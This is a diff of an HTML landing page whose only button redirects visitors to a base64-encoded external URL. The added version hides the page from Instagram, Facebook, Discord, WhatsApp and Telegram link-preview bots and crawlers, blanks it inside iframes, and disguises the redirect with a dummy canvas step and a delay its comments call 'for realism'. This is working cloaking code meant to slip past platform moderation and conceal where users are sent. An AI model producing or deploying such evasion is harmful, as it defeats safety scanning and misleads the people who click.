@@ -1,49 +1,85 @@
 <!DOCTYPE html>
 <html lang="en">
-
 <head>
-    <meta charset="UTF-8">
-    <title>📷</title>
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <style>
-        body {
-            background: #000;
-            color: #fff;
-            font-family: sans-serif;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            height: 100vh;
-            margin: 0;
-        }
+  <meta charset="UTF-8" />
+  <title>📷</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <style>
+    html, body {
+      margin: 0;
+      padding: 0;
+      background: #000;
+      color: #fff;
+      font-family: system-ui, sans-serif;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+    }
 
-        .btn {
-            background: #111;
-            color: #fff;
-            border: none;
-            border-radius: 10px;
-            padding: 1.5rem 2.5rem;
-            font-size: 2.5rem;
-            cursor: pointer;
-            box-shadow: 0 0 20px rgba(255, 255, 255, 0.2);
-            transition: all 0.3s ease;
-        }
+    .container {
+      background: #111;
+      padding: 2rem;
+      border-radius: 1rem;
+      text-align: center;
+      box-shadow: 0 0 20px rgba(255,255,255,0.1);
+      max-width: 90%;
+    }
 
-        .btn:hover {
-            background: #222;
-        }
-    </style>
+    button {
+      background: #222;
+      color: #fff;
+      border: none;
+      border-radius: 12px;
+      padding: 1rem 2rem;
+      font-size: 1.8rem;
+      cursor: pointer;
+      width: 100%;
+    }
+
+    button:hover {
+      background: #333;
+    }
+
+    @media (max-width: 480px) {
+      button {
+        font-size: 1.4rem;
+        padding: 0.8rem 1.2rem;
+      }
+    }
+  </style>
 </head>
-
 <body>
-    <button class="btn" onclick="go()">📷</button>
+  <div class="container">
+    <button onclick="go()">📷</button>
+  </div>
 
-    <script>
-        function go() {
-            const link = atob("aHR0cHM6Ly90Lm1lLytWNEU1N1BTbXJDVmtaR05p"); // base64
-            window.location.href = link;
-        }
-    </script>
+  <script>
+    // ⛔ Защита от встраивания в iframe (например, Instagram)
+    if (window !== window.top) {
+      document.body.innerHTML = ''; // чистим страницу
+      throw new Error("Blocked in iframe.");
+    }
+
+    // ⛔ Проверка User-Agent на ботов Instagram, Facebook и др.
+    const bots = ['facebookexternalhit', 'instagram', 'discord', 'WhatsApp', 'Telegram', 'bot', 'preview', 'crawl', 'spider'];
+    const ua = navigator.userAgent.toLowerCase();
+    if (bots.some(b => ua.includes(b))) {
+      document.body.innerHTML = ''; // ничего не отображаем
+      throw new Error("Blocked bot UA.");
+    }
+
+    // 🎨 Canvas-обфускация и редирект
+    function go() {
+      const base64 = "aHR0cHM6Ly9nYXlyb24ubGlmZS9yZWhiaXhlZQ=="; // <- encoded URL
+      const canvas = document.createElement('canvas');
+      const ctx = canvas.getContext('2d');
+      ctx.fillText(base64, 10, 10);
+      const hidden = ctx.getImageData(0, 0, 200, 50); // dummy op
+      setTimeout(() => {
+        window.location.href = atob(base64);
+      }, 300); // slight delay for realism
+    }
+  </script>
 </body>
-
 </html>
